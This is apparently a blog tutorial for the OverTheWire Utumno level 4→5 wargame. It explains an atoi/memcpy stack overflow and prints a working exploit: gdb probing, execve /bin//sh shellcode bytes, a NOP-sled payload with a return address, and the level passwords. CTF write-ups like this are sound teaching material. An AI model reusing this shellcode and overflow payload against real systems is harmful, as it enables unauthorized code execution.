---
date: 2023-09-12 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Utumno Level 4 → 5 tutorial!!"
permalink: /posts/Over-The-Wire-Utumno-Level-4-to-5/
tags: [overthewire, utumno, pwn, atoi, memcpy, stack-overflow, shellcode, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Utumno Level 4 → 5!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Utumno level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Utumno-Level-3-to-4/' | relative_url }}">← Previous: Level 3 → 4</a>
  </div>
  <div class="nav-center">
    <a href="https://overthewire.org/wargames/utumno/utumno5.html" target="_blank" rel="noopener">Official (Level 5) ↗</a>
  </div>
  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Utumno-Level-5-to-6/' | relative_url }}">Next: Level 5 → 6 →</a>
  </div>
</nav>

## Login

Use the password from **Level 3 → 4**:

```bash
ssh utumno4@utumno.labs.overthewire.org -p 2227
# password: oogieleoga
````

Then move to the game folder:

```bash
cd /utumno
```

---

## Task

Binary: **`/utumno/utumno4`**

* When run **without arguments**, it segfaults immediately.
* With arguments, it:

  1. Parses the **first argument with `atoi`** (size),
  2. Copies **that many bytes** from the **second argument** into a **huge stack buffer** via `memcpy`.
* There’s also a **16-bit check** against the lower half of the parsed size (`AX`) to ensure it’s ≤ 63—easy to bypass.

Goal: overflow the stack to **control EIP**, then **return into our shellcode** placed inside the copied buffer.

---

## Source Code (Disassembly Excerpt)

```asm
0x0804844b <+0>:   push  ebp
0x0804844c <+1>:   mov   ebp,esp
0x0804844e <+3>:   sub   esp,0xff04

0x08048454 <+9>:   mov   eax,[ebp+0xc]
0x08048457 <+12>:  add   eax,0x4
0x0804845a <+15>:  mov   eax,[eax]           ; EAX = ptr to argv[1]
0x0804845c <+17>:  push  eax
0x0804845d <+18>:  call  atoi                ; atoi(argv[1])
0x08048462 <+23>:  add   esp,0x4
0x08048465 <+26>:  mov   [ebp-0x4],eax       ; save parsed size
0x08048468 <+29>:  mov   eax,[ebp-0x4]
0x0804846b <+32>:  mov   [ebp-0x6],ax        ; keep low 16 bits in AX
0x0804846f <+36>:  cmp   word [ebp-0x6],0x3f ; AX <= 63 ?
0x08048474 <+41>:  jbe   0x804847d           ; if yes, continue
0x08048476 <+43>:  push  0x1
0x08048478 <+45>:  call  exit

0x0804847d <+50>:  mov   edx,[ebp-0x4]       ; edx = size (full 32-bit)
0x08048480 <+53>:  mov   eax,[ebp+0xc]
0x08048483 <+56>:  add   eax,0x8
0x08048486 <+59>:  mov   eax,[eax]           ; eax = argv[2]
0x08048488 <+61>:  push  edx                 ; n = size
0x08048489 <+62>:  push  eax                 ; src = argv[2]
0x0804848a <+63>:  lea   eax,[ebp-0xff02]    ; dst = big local buf
0x08048490 <+69>:  push  eax
0x08048491 <+70>:  call  memcpy              ; memcpy(dst, src, n)
0x08048496 <+75>:  add   esp,0xc
0x08048499 <+78>:  mov   eax,0x0
0x0804849e <+83>:  leave
0x0804849f <+84>:  ret
```

**Key idea:** If we choose a **very large size** whose **low 16 bits ≤ 63**, the check passes but `memcpy` still copies the **full large size**, smashing the stack into saved EIP.

---

## Exploitation Steps

### 1) Bypass the AX check and confirm EIP control

Use **65536** (`0x00010000`): `AX = 0x0000` (≤ 63), so the check passes, while `memcpy` attempts to copy 65536 bytes.

```bash
gdb -q ./utumno4
(gdb) run 65536 $(python -c "print 'A' * 65536")
# Program received signal SIGSEGV, 0x41414141  → RIP/EIP = 'AAAA'
```

Find the precise EIP offset by probing:

```bash
(gdb) run 65536 $(python -c "print 'A' * 65286 + 'BBBB' + 'C' * 246")
# Program received signal SIGSEGV, 0x42424242  → correct overwrite point
```

*(In this run, EIP is hit by the 4 B’s after 65286 A’s; your exact offset may vary slightly.)*

---

### 2) Drop shellcode + NOP sled and pick a return

Craft the second argument as:

```
[ NOP sled ] [ shellcode ] [ RET (little endian) ] [ padding ]
```

Example shellcode (`/bin//sh`):

```
\x31\xc9\xf7\xe1\xb0\x0b\x51
\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\xcd\x80
```

Probe the stack to pick an address **inside your sled**:

```bash
(gdb) run 65536 $(python -c "print '\x90' * 65265 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'BBBB' + '\x90' * 246")
(gdb) x/300x $esp-300
# ... lots of 0x90 ...
# sled & shellcode visible around 0xfffed660
```

Here, **`0xfffed660`** sits in the sled, so we’ll use **`\x60\xd6\xfe\xff`** as our RET (little-endian).

---

### 3) Win

Final run:

```bash
./utumno4 65536 $(python -c "print '\x90' * 65257 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 8 * '\x90' + '\x60\xd6\xfe\xff' + 'C' * 246")
$ whoami
utumno5
$ cat /etc/utumno_pass/utumno5
woucaejiek
```

---

## Password

From my run:

```
woucaejiek
```

---

## Quick One-liner

```bash
/utumno/utumno4 65536 $(python - <<'PY'
print '\x90'*65257 + \
      '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + \
      '\x90'*8 + \
      '\x60\xd6\xfe\xff' + \
      'C'*246
PY
)
```

---

## Troubleshooting

* **AX check keeps failing / exits early?** Use a size whose **low 16 bits ≤ 63**—`65536` works because `AX == 0`.
* **No EIP control?** Adjust the offset near **65286** and confirm with a marker (`'BBBB'`).
* **Shellcode not reached?** Pick a **return address inside your NOP sled** (`gdb x/300x $esp-300`) and ensure it’s in **little-endian**.
* **Crashes before shellcode?** Add a few extra NOPs **after** the shellcode to absorb slight address jitter.
* **Quoting issues in the shell?** Prefer Python heredocs or escape quotes carefully inside the subshell.

---

**Congrats 🎉** You abused a **16-bit size check** to drive a **massive `memcpy` overflow** and returned straight into your sled + shellcode—clean and satisfying!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
